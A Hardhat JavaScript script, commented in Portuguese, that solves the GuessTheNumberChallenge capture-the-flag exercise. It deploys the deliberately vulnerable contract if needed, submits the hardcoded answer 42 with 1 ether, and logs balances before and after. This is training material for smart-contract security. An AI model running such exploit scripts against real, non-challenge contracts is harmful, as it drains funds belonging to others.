const hre = require("hardhat");

async function main() {
  console.log("ðŸ” Iniciando exploit do GuessTheNumberChallenge...\n");

  // O endereÃ§o do contrato pode ser passado como variÃ¡vel de ambiente
  // Se nÃ£o fornecido, fazemos o deploy primeiro
  let contractAddress = process.env.CONTRACT_ADDRESS;
  
  if (!contractAddress) {
    console.log("ðŸ“¦ Nenhum endereÃ§o fornecido. Fazendo deploy do contrato...\n");
    
    const [deployer] = await hre.ethers.getSigners();
    
    // Deploy do contrato enviando 1 ether
    const GuessTheNumberChallenge = await hre.ethers.getContractFactory("GuessTheNumberChallenge");
    const guessChallenge = await GuessTheNumberChallenge.deploy({
      value: hre.ethers.parseEther("1.0")
    });
    await guessChallenge.waitForDeployment();
    contractAddress = await guessChallenge.getAddress();
    
    console.log("âœ… Contrato deployado em:", contractAddress);
    console.log("");
  }

  // Conectar ao contrato
  const GuessTheNumberChallenge = await hre.ethers.getContractFactory("GuessTheNumberChallenge");
  const contract = GuessTheNumberChallenge.attach(contractAddress);

  // Obter contas
  const [attacker] = await hre.ethers.getSigners();
  
  // Verificar estado antes do exploit
  const balanceBefore = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteBefore = await contract.isComplete();
  const attackerBalanceBefore = await hre.ethers.provider.getBalance(attacker.address);
  
  console.log("ðŸ“ EndereÃ§o do contrato:", contractAddress);
  console.log("ðŸ‘¤ Atacante:", attacker.address);
  console.log("");
  console.log("ðŸ“Š Estado antes do exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceBefore), "ETH");
  console.log("  - Saldo do atacante:", hre.ethers.formatEther(attackerBalanceBefore), "ETH");
  console.log("  - Desafio completo:", isCompleteBefore);
  console.log("");

  if (isCompleteBefore) {
    console.log("âœ… O desafio jÃ¡ estÃ¡ completo!");
    return;
  }

  // Executar o exploit: adivinhar o nÃºmero 42
  // O nÃºmero estÃ¡ hardcoded no contrato, entÃ£o podemos vÃª-lo
  const answer = 42;
  console.log("ðŸŽ¯ Executando exploit: adivinhando o nÃºmero", answer);
  console.log("ðŸ’¡ O nÃºmero estÃ¡ hardcoded no contrato, entÃ£o podemos vÃª-lo!\n");
  
  const tx = await contract.guess(answer, {
    value: hre.ethers.parseEther("1.0")
  });
  console.log("ðŸ“¤ Transaction enviada:", tx.hash);
  
  await tx.wait();
  console.log("âœ… Transaction confirmada!\n");

  // Verificar estado apÃ³s o exploit
  const balanceAfter = await hre.ethers.provider.getBalance(contractAddress);
  const isCompleteAfter = await contract.isComplete();
  const attackerBalanceAfter = await hre.ethers.provider.getBalance(attacker.address);
  
  console.log("ðŸ“Š Estado apÃ³s o exploit:");
  console.log("  - Saldo do contrato:", hre.ethers.formatEther(balanceAfter), "ETH");
  console.log("  - Saldo do atacante:", hre.ethers.formatEther(attackerBalanceAfter), "ETH");
  console.log("  - Desafio completo:", isCompleteAfter);
  
  if (isCompleteAfter) {
    console.log("\nðŸŽ‰ Desafio completado! O nÃºmero foi adivinhado corretamente");
    console.log("ðŸ’° VocÃª recebeu 2 ether de volta (1 ether enviado + 1 ether de lucro)");
  } else {
    console.log("\nâŒ Algo deu errado. O desafio nÃ£o foi completado.");
  }
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });

